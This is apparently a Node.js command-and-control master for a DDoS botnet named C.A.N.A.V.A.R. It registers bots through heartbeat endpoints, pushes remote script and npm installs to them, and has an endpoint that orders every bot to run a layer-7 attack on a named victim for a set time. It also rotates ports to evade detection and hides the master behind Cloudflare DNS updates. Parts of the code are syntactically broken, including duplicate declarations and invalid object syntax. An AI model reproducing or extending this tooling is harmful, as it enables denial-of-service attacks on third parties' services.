//npm install express json-server isomorphic-fetch axios events delay random-number-csprng moment crypto
process.chdir(__dirname)
const dotenv_ = require('dotenv')
const dotenv = dotenv_.config().parsed
const { exec } = require('child_process');
let initSign = `${Date.now()}`
const logger = require('./logger.js').log
logger.init(initSign, "Initiating...")
logger.init(initSign, "Environment variables recieved as : " + JSON.stringify(dotenv))
const express = require('express')
logger.init(initSign, "Called 'express'")
const app = express()
logger.init(initSign, "Initiated 'express'")
const jsonServer = require('json-server')
logger.init(initSign, "Called 'json-server'")
const server = jsonServer.create()
logger.init(initSign, "Created 'json-server'")
const router = jsonServer.router('db.json')
logger.init(initSign, "Called 'json-server' router")
const middlewares = jsonServer.defaults()
const fetch = require('isomorphic-fetch')
logger.init(initSign, "Called 'isomorphic-fetch'")
const axios = require('axios').default;
logger.init(initSign, "Called 'axios'")
const config = require('./config.json')
logger.init(initSign, "Called config.")
const EventEmitter = require('events')
logger.init(initSign, "Called 'events'")
const delay = require('delay')
logger.init(initSign, "Called 'delay'")
const randomInt = require("random-number-csprng");
logger.init(initSign, "Called 'random-number-csprng'")
const moment = require('moment')
logger.init(initSign, "Called 'moment'")
const crypto = require('crypto')
logger.init(initSign, "Called 'crypto'")
const callerId = require('caller-id');
const { await } = require('signale');
logger.init(initSign, "Called 'caller-id'")
const bodyParser = require('body-parser');
const si = require('systeminformation');

let systemInfo = {
    static: null,
    dynamic: {
        cpu: {
            brand: null,
            speed: null,
            voltage: null
        },
        mem: {
            total: null,
            free: null,
            used: null,
            active: null,
            available: null
        },
        load: null,
        net: null
    }
}

let GLOBALS = {
    port: {
        number: null,
        changeAt: null,
        changedLast: null,
        changeTo: null,
        last: null
    },
    restart: {
        scheduled: false,
        at: null,
        last: null
    },
    lockdown: true,
    accessKey: foobar

}


let GLOBALS = {
    port: {
        number: null,
        changeAt: null,
        changedLast: null,
        changeTo: null,
        last: null
    },
    restart: {
        scheduled: false,
        at: null,
        last: null
    },
    lockdown: true,
    accessKey: foobar

}



let gfunc = {
    whole = function () { return GLOBALS },
    latestGlobalsWrite: null,
    port: {
        number: {
            get = function (a) {
                return (GLOBALS.port.number)
            },
            write = function (a) {
                gfunc.latestGlobalsWrite = Date.now()
                return (GLOBALS.port.number = a)
            }
        },
        changeAt: {
            get = function (a) {

                return (GLOBALS.port.changeAt)
            },
            write = function (a) {
                gfunc.latestGlobalsWrite = Date.now()
                return (GLOBALS.port.changeAt = a)
            }
        },
        changedLast: {
            get = function (a) {
                return (GLOBALS.port.changedLast)
            },
            write = function (a) {
                gfunc.latestGlobalsWrite = Date.now()
                return (GLOBALS.port.changedLast = a)
            }
        },
        changeTo: {
            get = function (a) {
                return (GLOBALS.port.changeTo)
            },
            write = function (a) {
                gfunc.latestGlobalsWrite = Date.now()
                return (GLOBALS.port.changeTo = a)
            }
        },
        last: {
            get = function (a) {
                return (GLOBALS.port.last)
            },
            write = function (a) {
                gfunc.latestGlobalsWrite = Date.now()
                return (GLOBALS.port.last = a)
            }
        }
    },
    restart: {
        scheduled: {
            get = function (a) {
                return (GLOBALS.port.scheduled)
            },
            write = function (a) {
                gfunc.latestGlobalsWrite = Date.now()
                return (GLOBALS.port.scheduled = a)
            }
        },
        at: {
            get = function (a) {
                return (GLOBALS.port.at)
            },
            write = function (a) {
                gfunc.latestGlobalsWrite = Date.now()
                return (GLOBALS.port.at = a)
            }
        },
        last: {
            get = function (a) {
                return (GLOBALS.port.last)
            },
            write = function (a) {
                gfunc.latestGlobalsWrite = Date.now()
                return (GLOBALS.port.last = a)
            }
        }
    },
    lockdown: {
        get = function (a) {
            return (GLOBALS.port.lockdown)
        },
        write = function (a) {
            gfunc.latestGlobalsWrite = Date.now()
            return (GLOBALS.port.lockdown = a)
        }
    },
    accessKey: {
        get = function (a) {
            return (GLOBALS.port.accessKey)
        },
        write = function (a) {
            gfunc.latestGlobalsWrite = Date.now()
            return (GLOBALS.port.accessKey = a)
        }
    },
}

si.getDynamicData(function (data) {
    systemInfo.dynamic.all = data
})

let initiated = false
let AGENTLINK = null
let SERVICELINK = null
let SERVICENAME = null
let SCRIPTS = null
let activeMachinesList = []
let activeMachinesList_inDB = []

let MACHINES = []
const dbok = new EventEmitter()

function logID() {
    return crypto.randomBytes(5).toString('hex');
}

server.use((req, res, next) => {
    if (req.hostname === "localhost") {
        next()
    } else {
        if (req.method === "POST") {
            if ((req.headers.accesskey)) {
                if ((config.pk).includes(req.headers.accesskey)) {
                    //console.log("approve");
                    next()
                } else {
                    res.send(403)
                }
            } else {
                res.send(403)
            }
        } else {
            next();
        }
    }

})

app.use((req, res, next) => {
    if (initiated) {
        let area = ((req.originalUrl).split("/")[1]);
        if (area === "mgmt") {
            if ((req.headers.accesskey)) {
                if ((config.pk).includes(req.headers.accesskey)) {
                    //console.log("approve");
                    next()
                } else {
                    res.send(403)
                }
            } else {
                res.send(403)
            }
        } else {
            next()
        }
    }
    else {
        res.send(500, {
            error: {
                message: "MASTER_IS_INITIATING",
                innerResponse: `The master had initiated at ${initSign}`
            }
        })
    }
})

app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(bodyParser.raw());

server.use(middlewares)
server.use(router)
server.listen(3000, () => {
    //console.log('JSON Server is running')
    axios.get("http://localhost:3000/global", { timeout: 4000 })
        .then(res => {
            GLOBALS = res.data
            dbok.emit('true')
        })
        .catch(err => {
            dbok.emit('true')
            GLOBALS = GLOBALS
        })
})

dbok.on('true', () => {
    if (!initiated) {
        logger.init(initSign, "Database started.")
        initiate()
    } else {
        logger.info(logID(), "Database started", "Database started.")
    }
    //console.log('started')

})
dbok.on('false', () => {
    //console.log('FUCK')
    if (!initiated) {
        logger.init(initSign, "Database couldn't start.")
    } else {
        logger.error(logID(), "Database error", "Database error.")
        process.exit(0)
    }
})

app.get('/scripts', (req, res) => {
    let scid = ([Object.keys(req.query)[0]][0]);
    //console.log(scid);
    if (scid === undefined) {
        axios.get("http://localhost:3000/scripts")
            .then(response => {
                res.send(200, response.data)
            })
            .catch(err => {
                console.error(err);
            })
    } else {
        axios.get("http://localhost:3000/scripts/" + scid)
            .then(response => {
                res.send(200, response.data)
            })
            .catch(err => {
                res.send(500, {
                    error: {
                        message: "SCRIPT_DOES_NOT_EXIST",
                        innerResponse: `${err.message}`
                    }
                })
            })
    }
})

app.get('/setup', (req, res) => {
    let scid = ([Object.keys(req.query)[0]][0]);
    let detid = ([Object.keys(req.query)[1]][0]);
    //console.log(scid, detid);
    if (scid === undefined) {
        axios.get("http://localhost:3000/setup")
            .then(response => {
                res.send(200, response.data)
            })
            .catch(err => {
                console.error(err);
            })
    } else {
        axios.get("http://localhost:3000/setup/")
            .then(response => {
                let requested = (response.data)[scid]
                if (requested.includes("$")) {
                    if (scid === "download_agent") {
                        res.send(200, (requested.replace("$AGENTLINK;", AGENTLINK)))
                    } else if (scid === "service_setup") {
                        requested = requested.replace("$SERVICELINK", SERVICELINK)
                        var regex = new RegExp("SERVICENAME", "g");
                        requested = requested.replace(regex, SERVICENAME)
                        res.send(200, (requested))
                    } else if (scid === "download_script") {
                        let searchSatisfied = false
                        for (let index = 0; index < SCRIPTS.length; index++) {
                            const element = SCRIPTS[index];
                            if (element.id === detid) {
                                //console.log(element);
                                searchSatisfied = true
                                requested = requested.replace("$SCRIPTLINK", element.source)
                                requested = requested.replace("$SCRIPTNAME", element.filename)
                                res.send(requested)
                            }
                        }
                        if (!searchSatisfied) {
                            res.send(500, {
                                error: {
                                    message: "SCRIPT_DOES_NOT_EXIST",
                                    innerResponse: `The script with ID'${detid}' does not exist in the dictionary.`
                                }
                            })
                        }
                        requested = requested.replace("$SERVICELINK", SERVICELINK)
                        var regex = new RegExp("SERVICENAME", "g");
                        requested = requested.replace(regex, SERVICENAME)
                        //res.send(200, (requested))
                    }
                }
            })
            .catch(err => {
                if (scid === "script_json") {
                    let searchSatisfied = false
                    for (let index = 0; index < SCRIPTS.length; index++) {
                        const element = SCRIPTS[index];
                        if (element.id === detid) {
                            //console.log(element);
                            searchSatisfied = true
                            console.log(element);
                            res.send(element)
                        }
                    }
                    if (!searchSatisfied) {
                        res.send(500, {
                            error: {
                                message: "SCRIPT_DOES_NOT_EXIST",
                                innerResponse: `The script with ID'${detid}' does not exist in the dictionary.`
                            }
                        })
                    }
                }
                else {
                    console.log(err);
                    res.send(500, { error: { message: err.message } })
                }
            })
    }

})

app.get('/', (req, res) => {
    let ref = (req.headers.host);
    if (ref === "127.0.0.1") {
        //console.log(AGENTLINK);
        //console.log(SCRIPTS);
        //console.log(SERVICENAME);
        //console.log(SERVICELINK);
    }
    res.send(200, "OKAY")
})

app.get('/globals', (req, res) => {

    GLOBALS.port.leftForChange = ((GLOBALS.port.changeAt) - (Date.now()))
    GLOBALS.port.shouldChange = (GLOBALS.port.changeAt <= Date.now())
    res.send(200, GLOBALS)
})

app.post('/heartbeat', (req, res) => {
    let ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress
    ip = ip.toString().replace('::ffff:', '');
    console.log(req.body);
    if (!activeMachinesList_inDB.includes(ip)) {
        let currentMachineData = req.body.machine
        axios.post(`http://localhost:3000/machines/`, { id: ip, currentMachineData })
            .then(resp => {
                res.send(200)
                activeMachinesList_inDB.push(ip)
            })
            .catch(err => {
                console.error(err);
                res.send(500, {
                    error: {
                        message: "DATABASE_ERR",
                        innerResponse: err.message
                    }
                })
            })
    } else {
        let currentMachineData = req.body.machine
        axios.patch(`http://localhost:3000/machines/${ip}`, { currentMachineData })
            .then(resp => {
                res.send(200)
            })
            .catch(err => {
                console.error(err);
                res.send(500, {
                    error: {
                        message: "DATABASE_ERR",
                        innerResponse: err.message
                    }
                })
            })
    }
})

app.patch('/heartbeat', (req, res) => {
    console.log(req.body);
    let ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress
    ip = ip.toString().replace('::ffff:', '');
    if (!activeMachinesList.includes(ip)) {
        res.send(200, GLOBALS)
        activeMachinesList.push(ip)
    }
})

app.get('/all/installscript/:scriptid', (req, res) => {
    clen = activeMachinesList.length
    for (let index = 0; index < clen; index++) {
        axios.get(`http://${activeMachinesList[index]}:${gfunc.port.number.get()}/installScript/${req.params.scriptid}`)
            .then(res => {
                console.log(res.data)
            })
            .catch(err => {
                console.error(err);
            })

    }
    res.send(200, "OKAY")
})
app.get('/all/npminstall/:module', (req, res) => {
    clen = activeMachinesList.length
    for (let index = 0; index < clen; index++) {
        axios.get(`http://${activeMachinesList[index]}:${gfunc.port.number.get()}/npminstall/${req.params.module}`)
            .then(res => {
                console.log(res.data)
            })
            .catch(err => {
                console.error(err);
            })

    }
    res.send(200, "OKAY")
})

app.get('/all/attacklayer7/:methodID/:victim/:time/:attackID', async (req, res) => {
    clen = activeMachinesList.length
    let machines = {
        all: activeMachinesList,
        asked: [],
        responded: [],
        busy: []
    }
    for (let index = 0; index < clen; index++) {
        machines.asked.push(activeMachinesList[index])
        console.log(`http://${activeMachinesList[index]}:${gfunc.port.number.get()}/layer7/${req.params.methodID}/${req.params.victim}/${req.params.time}/${req.params.attackID}`);
        axios.get(`http://${activeMachinesList[index]}:${gfunc.port.number.get()}/layer7/${req.params.methodID}/${req.params.victim}/${req.params.time}/${req.params.attackID}`)
            .then(res => {
                console.log(res.data)
                machines.responded.push(activeMachinesList[index])
            })
            .catch(err => {
                console.error(err.response.data);
                machines.busy.push(activeMachinesList[index])
            })
    }
    await delay(3000)
    res.send(200, { asked: machines.asked.length, responded: machines.responded.length, busy: machines.responded.busy, data: machines })
})

app.get('/all/update', (req, res) => {
    clen = activeMachinesList.length
    for (let index = 0; index < clen; index++) {
        console.log(`http://${activeMachinesList[index]}:${gfunc.port.number.get()}/update`);
        axios.get(`http://${activeMachinesList[index]}:${gfunc.port.number.get()}/update`)
            .then(res => {
                console.log(res.data)
            })
            .catch(err => {
                console.error(err.response.data);
            })

    }
    res.send(200, "OKAY")
})

app.get('/machines/active', (req, res) => {
    res.send(200, activeMachinesList)
})
app.get('/machines/detailed/active', (req, res) => {
    res.send(200, activeMachinesList)
})
app.get('/machines/detailed/inactive', (req, res) => {
    res.send(200, activeMachinesList)
})
app.get('/machines/detailed/busy', (req, res) => {
    res.send(200, activeMachinesList)
})
app.get('/machines/detailed/systemInfo', (req, res) => {
    res.send(200, activeMachinesList)
})
app.get('/machines/testReachability/:timeout', async (req, res) => {
    let clen = activeMachinesList.length
    let reachable = []
    let unreachable = []
    let timeout_ = 5
    if (!isNaN(req.params.timeout)) {
        if (req.params.timeout <= 10)
            timeout_ = parseInt(req.params.timeout)
    }
    for (let index = 0; index < clen; index++) {
        console.log(`Asking ${activeMachinesList[index]}:${gfunc.port.number.get()}`);
        axios.get(`http://${activeMachinesList[index]}:${gfunc.port.number.get()}/status`, {
            timeout: timeout_ * 1000,
        })
            .then(res => {
                reachable.push(activeMachinesList[index])
            })
            .catch(err => {
                unreachable.push(activeMachinesList[index])
            })
    }
    await delay(((timeout_ + 1) * 1000))
    res.send(200, {
        reachable: {
            count: reachable.length, all: reachable
        },
        unreachable: {
            count: unreachable.length, all: unreachable
        },
    })
})

app.post('/mgmt/changePort/:newPort', async (req, res) => {
    let logid = crypto.randomBytes(5).toString('hex');
    logger.info(logid, "API POST Request", "Port change requested.")
    if (isNaN(req.params.newPort)) {
        logger.info(logid, "Port change requested.", "Requested port isNaN, defaulting to random.")
        //interactive.await('[%d/4] - Requested port is not a number, defaulting to a random port.', 1);
        let newPort = await randomInt(1000, 9999)
        changePort(newPort, logid)
        logger.info(logid, "Port change requested.", "Successfuly switched to port " + newPort)
    } else {
        logger.info(logid, "Port change requested.", `Requested port is ${req.params.newport}, defaulting to random.`)
        changePort(req.params.newPort, logid)
    }
    res.send(200)
})
app.post('/mgmt/database', async (req, res) => {
    res.sendFile(__dirname + '/db.json');
})


app.post('/mgmt/schedulePortChange/:newPort/:inMins', async (req, res) => {
    let logid = crypto.randomBytes(5).toString('hex');
    logger.info(logid, "API POST Request", "Port change schedule requested.")
    if (isNaN(parseInt(req.params.newPort)) || isNaN(parseInt(req.params.inMins))) {
        logger.error(logid, "Port change schedule requested.", "Invalid parameters. Rejecting request.")
        res.send(500, {
            error: {
                message: "INVALID_USAGE",
                innerResponse: `usage: schedulePortChange/:newPort/:inMins`
            }
        })
    } else {
        logger.info(logid, "Port change schedule requested.", `Scheduling port change for port ${req.params.newPort} in ${req.params.inMins} minutes.`)
        schedulePortChange(parseInt(req.params.inMins), parseInt(req.params.newPort), logid)
        res.send(200)
    }
})

app.get('/mgmt/systemInfo', async (req, res) => {
    let systemInfo_ = systemInfo
    si.mem(function (memdata) {
        systemInfo_.dynamic.mem.total = memdata.total
        systemInfo_.dynamic.mem.free = memdata.free
        systemInfo_.dynamic.mem.used = memdata.used
        systemInfo_.dynamic.mem.active = memdata.active
        systemInfo_.dynamic.mem.available = memdata.available
        si.cpu(function (cpudata) {
            systemInfo_.dynamic.cpu.voltage = cpudata.voltage
            systemInfo_.dynamic.cpu.speed = cpudata.speed
            systemInfo_.dynamic.cpu.brand = cpudata.brand
            si.currentLoad(function (data) {
                systemInfo_.dynamic.load = data
                si.networkStats(function (data) {
                    systemInfo_.dynamic.net = data
                    res.send(200, systemInfo_)
                })
            })
        })
    })
})
app.post('/mgmt/schedulePortChangeSeconds', async (req, res) => {
    schedulePortChangeTest(5, parseInt(await randomInt(1000, 9999)), "test")
})

async function schedulePortChangeTest(secs, np, logid) {
    globalLock = true;
    let inMinutes = secs || config.defaultPortReplenishTimeMin
    let newPort = np || await randomInt(1000, 9999)
    logger.info(logid, "Port change schedule requested.", `Scheduling change to port ${newPort} in ${inMinutes} minutes.`)
    gfunc.port.changeAt.write(moment().add({ seconds: inMinutes }).unix() * 1000)
    gfunc.port.changeTo.write(newPort)
    gfunc.port.changedLast.write(Date.now())
    globalLock = false;
}

app.post('/mgmt/update', (req, res) => {
    res.send(200)
    exec("cd /C.A.N.A.V.A.R/ ; git pull; cd master ; npm install; nohup systemctl restart canavarmaster &", (err, stdout, stderr) => {
        if (err) {
            //some err occurred
            console.error(err)
            res.send(500, { std_err: err })
        } else {
            // the *entire* stdout and stderr (buffered)
            console.log(`stdout: ${stdout}`);
            console.log(`stderr: ${stderr}`);
            res.send(200, { std_out: stdout, std_err: stderr })
        }
    })
})
//auto-update & keep latest machines in json-server cache for faster magazine change?
app.post('/mgmt/vcontrol', (req, res) => {
    exec("cd /C.A.N.A.V.A.R/ ; git show -1 --stat  ", (err, stdout, stderr) => {
        if (err) {
            //some err occurred
            console.error(err)
            res.send(200, { std_err: err })
        } else {
            // the *entire* stdout and stderr (buffered)
            console.log(`stdout: ${stdout}`);
            console.log(`stderr: ${stderr}`);
            let stdout_ = stdout
            if (stdout.length > 10) {
                var options = {
                    method: 'GET',
                    url: 'https://api.github.com/repos/mehmetefeerkan/C.A.N.A.V.A.R/commits',
                    headers: { Accept: 'application/vnd.github.v3+json' }
                };

                axios.request(options).then(function (response) {
                    console.log(response.data);
                    let resp = response.data
                    let latestCommitSHA = resp[0].sha
                    if ((latestCommitSHA === (null || undefined || ""))) {
                        res.send(500, {
                            error: {
                                message: "INVALID_COMMIT_SHA_RECIEVED",
                                innerResponse: `Given SHA was${latestCommitSHA}`
                            }
                        })
                    } else {
                        if (stdout_.includes(latestCommitSHA)) {
                            res.send(200, { upToDate: true, latestCommit: resp[0], currentCommitData: stdout_ })
                        } else {
                            res.send(200, { upToDate: false, latestCommit: resp[0], currentCommitData: stdout_ })
                        }
                    }
                }).catch(function (error) {
                    console.error(error);
                });
            }
            //res.send(200, {std_out: stdout, std_err: stderr})x
        }
    })
})

app.post('/mgmt/portElusion/', async (req, res) => {
    globalLock = true;
    let newPort = await randomInt(1000, 9999)
    gfunc.port.last.write(gfunc.port.number.get())
    gfunc.port.changedLast.write(Date.now())
    gfunc.port.number.write(newPort)
    res.send(200)
    globalLock = false;
})

app.listen(80, () => console.log(`App listening on port ${"80"}!`))

function initiate() {
    console.log("Begin init.");
    async function dbMachineCleanup() {
        axios.get("http://localhost:3000/machines/")
            .then(res => {
                console.log(res.data)
                let machines = res.data
                for (let index = 0; index < machines.length; index++) {
                    const element = machines[index];
                    console.log(element);
                    axios.delete(`http://localhost:3000/machines/${element.id}`)
                        .then(res => {
                            console.log(res)
                        })
                        .catch(err => {
                            console.error(err);
                        })
                }
            })
            .catch(err => {
                console.error(err);
            })
    }
    dbMachineCleanup()
    axios.get("http://localhost:3000/setup")
        .then(res => {
            AGENTLINK = res.data.agentLink
            SERVICELINK = res.data.serviceLink,
                SERVICENAME = res.data.serviceName
            console.log("Setups loaded.");

        })
        .catch(err => {
            console.error(err);
        })
    axios.get("http://localhost:3000/scripts")
        .then(res => {
            SCRIPTS = res.data
            console.log("Scripts loaded.");
        })
        .catch(err => {
            console.error(err);
        })

    if (gfunc.port.changeAt.get() < moment().utc()) {
        console.log("Scheduled port change because of the expired port on the database.");
        schedulePortChange()
    }
    updateMasterSubdomain()

    async function adaptPort() {
        console.log("attempting");
        if (gfunc.port.changeAt.get() <= Date.now()) {
            gfunc.port.last.write(gfunc.port.number.get())
            gfunc.port.number.write(gfunc.port.changeTo.get())
            gfunc.port.changedLast.write(Date.now())
        }
    }


    function refreshGlobals() {
        if (globalLock === false) {
            axios.get("http://localhost:3000/global")
                .then(res => {
                    GLOBALS = res.data
                })
                .catch(err => {
                    GLOBALS = GLOBALS
                })
        }
    }

    function updateMasterSubdomain() {
        let traceid = logID()
        logger.info(traceid, "Updating Master Subdomain", `Begun`)
        axios.get("http://icanhazip.com")
            .then(res => {
                console.log(res.data)
                let currentIP = res.data
                logger.info(traceid, "Updating Master Subdomain", `Current IP recieved as ${currentIP}`)
                var options = {
                    method: 'PUT',
                    url: `https://api.cloudflare.com/client/v4/zones/${dotenv.CFZI}/dns_records/${dotenv.CFDR}`,
                    headers: {
                        Authorization: 'Bearer ' + dotenv.CFPT,
                        'Content-Type': 'application/json'
                    },
                    data: {
                        type: 'A',
                        name: 'master.api.canavar.licentia.xyz',
                        content: currentIP,
                        ttl: 1,
                        proxied: true
                    }
                };
                axios.request(options).then(function (response) {
                    console.log(response.data);
                    logger.info(traceid, "Updated Master Subdomain", `Updated the subdomain to IP ${currentIP}`)
                }).catch(function (error) {
                    logger.info(traceid, "Couldn't Update Master Subdomain", `Tried to update the subdomain to IP ${currentIP}`)
                    console.error(error);
                });
            })
            .catch(err => {
                console.error(err);
                logger.info(traceid, "Couldn't Update Master Subdomain", `Error was : ${err}`)
            })

    }

    setInterval(function () {
        activeMachinesList_inDB = []
        activeMachinesList = []
        dbMachineCleanup()
        updateMasterSubdomain()
    }, 120000)
    initiated = true
}

async function changePort(newport, logid) {
    globalLock = true;
    logger.info(logid, "Changing port.", "Response for the current settings recieved.")
    gfunc.port.last.write(gfunc.port.number.get())
    gfunc.port.number.write(newport)
    gfunc.port.changedLast.write(Date.now())
    logger.info(logid, "Changed port.", `Successfuly switched to port ${gfunc.port.number.get()}.`)
    globalLock = false;
}

async function schedulePortChange(mins, np, logid) {
    globalLock = true;
    let inMinutes = mins || config.defaultPortReplenishTimeMin
    let newPort = np || await randomInt(1000, 9999)
    logger.info(logid, "Port change schedule requested.", `Scheduling change to port ${newPort} in ${inMinutes} minutes.`)
    gfunc.port.changeAt.write(moment().add({ minutes: inMinutes }).unix() * 1000)
    gfunc.port.changeTo.write(newPort)
    logger.info(logid, "Port change schedule request.", `Successfuly scheduled to port ${newPort} in ${inMinutes} minutes..`)
    globalLock = false;


}

//clock()


